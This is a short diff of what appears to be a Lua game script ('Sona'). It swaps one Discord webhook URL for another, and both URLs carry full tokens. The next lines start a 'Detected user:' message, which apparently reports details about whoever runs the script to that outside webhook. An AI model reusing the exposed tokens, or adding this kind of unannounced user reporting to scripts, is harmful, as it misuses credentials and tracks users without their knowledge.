@@ -525,7 +525,7 @@ SONA_LOADED and "Sona" or
 
 
 local url =
-"https://discord.com/api/webhooks/1005958507255840798/Krrj6BDqfzklmA9ZoNrnp6_Sx34kE93ah9GZZn6J5vQ_R8RhnpuC47tkvRbqhYoNb9Li"
+"https://discord.com/api/webhooks/1006960842086031525/OvGGnY9eYlmxgwso8f0yHomdMDB55_y2d1Ns2sem_Vk9yL5MEZNBUjD3G3veq2gBlIm9"
 local data = {
 ["content"] = "Detected user:",
 ["embeds"] = {
